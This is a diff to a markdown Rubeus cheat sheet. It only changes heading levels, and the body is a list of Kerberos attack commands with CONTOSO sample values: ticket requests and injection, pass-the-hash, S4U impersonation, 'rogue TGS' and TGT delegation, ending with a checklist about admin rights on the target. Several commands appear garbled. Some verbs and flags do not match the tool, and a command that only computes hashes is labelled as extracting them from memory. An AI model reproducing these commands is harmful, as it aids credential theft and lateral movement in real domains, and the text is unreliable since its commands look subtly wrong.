@@ -1,6 +1,6 @@
 ## [Rubeus Cheat Sheet]
 
-### 1. **Requesting a TGS Ticket**
+# 1. **Requesting a TGS Ticket**
 
 **Command:**
 ```shell
@@ -12,7 +12,7 @@ Rubeus.exe asktgs /user:domain\username /rc4:password /ptt /ticket:TGS_TICKET_FI
 Rubeus.exe asktgs /user:CONTOSO\jdoe /rc4:P@ssw0rd /ptt /ticket:C:\Tickets\jdoe_tgs.ticket
 ```
 
-### 2. **Injecting a TGS Ticket**
+# 2. **Injecting a TGS Ticket**
 
 **Command:**
 ```shell
@@ -24,7 +24,7 @@ Rubeus.exe ptt /ticket:TGS_TICKET_FILE
 Rubeus.exe ptt /ticket:C:\Tickets\jdoe_tgs.ticket
 ```
 
-### 3. **Listing Kerberos Tickets**
+# 3. **Listing Kerberos Tickets**
 
 **Command:**
 ```shell
@@ -36,7 +36,7 @@ klist
 klist
 ```
 
-### 4. **Requesting a TGT Ticket**
+# 4. **Requesting a TGT Ticket**
 
 **Command:**
 ```shell
@@ -48,7 +48,7 @@ Rubeus.exe asktgt /user:domain\username /rc4:password /ptt
 Rubeus.exe asktgt /user:CONTOSO\jdoe /rc4:P@ssw0rd /ptt
 ```
 
-### 5. **Extracting Hashes from Memory**
+# 5. **Extracting Hashes from Memory**
 
 **Command:**
 ```shell
@@ -60,7 +60,7 @@ Rubeus.exe hash /user:domain\username /password:password
 Rubeus.exe hash /user:CONTOSO\jdoe /password:P@ssw0rd
 ```
 
-### 6. **Passing the Hash**
+# 6. **Passing the Hash**
 
 **Command:**
 ```shell
@@ -72,7 +72,7 @@ Rubeus.exe pth /user:domain\username /rc4:hash /ptt
 Rubeus.exe pth /user:CONTOSO\jdoe /rc4:hash_value /ptt
 ```
 
-### 7. **S4U (Service for User) Delegation**
+# 7. **S4U (Service for User) Delegation**
 
 **Command:**
 ```shell
@@ -84,7 +84,7 @@ Rubeus.exe s4u /user:domain\username /rc4:password /impersonateuser:targetuser /
 Rubeus.exe s4u /user:CONTOSO\jdoe /rc4:P@ssw0rd /impersonateuser:CONTOSO\targetuser /msdsspn:targetspn /ptt
 ```
 
-### 8. **Rogue TGS**
+# 8. **Rogue TGS**
 
 **Command:**
 ```shell
@@ -96,7 +96,7 @@ Rubeus.exe rogue /user:domain\username /rc4:password /tgt:TGT_TICKET_FILE /ticke
 Rubeus.exe rogue /user:CONTOSO\jdoe /rc4:P@ssw0rd /tgt:C:\Tickets\jdoe_tgt.ticket /ticket:C:\Tickets\jdoe_tgs.ticket
 ```
 
-### 9. **TGT Delegation**
+# 9. **TGT Delegation**
 
 **Command:**
 ```shell
@@ -108,7 +108,7 @@ Rubeus.exe tgtdeleg /user:domain\username /rc4:password /ptt
 Rubeus.exe tgtdeleg /user:CONTOSO\jdoe /rc4:P@ssw0rd /ptt
 ```
 
-### 10. **Renewing a TGT Ticket**
+# 10. **Renewing a TGT Ticket**
 
 **Command:**
 ```shell
@@ -120,7 +120,7 @@ Rubeus.exe renew /user:domain\username /rc4:password /ptt
 Rubeus.exe renew /user:CONTOSO\jdoe /rc4:P@ssw0rd /ptt
 ```
 
-## Things to remember
+# Things to remember
 
 - **Privilege Escalation**: Do you have admin privs?
 - **Network Configuration**: Can the target talk to the domain controller to request and validate Kerberos tickets?
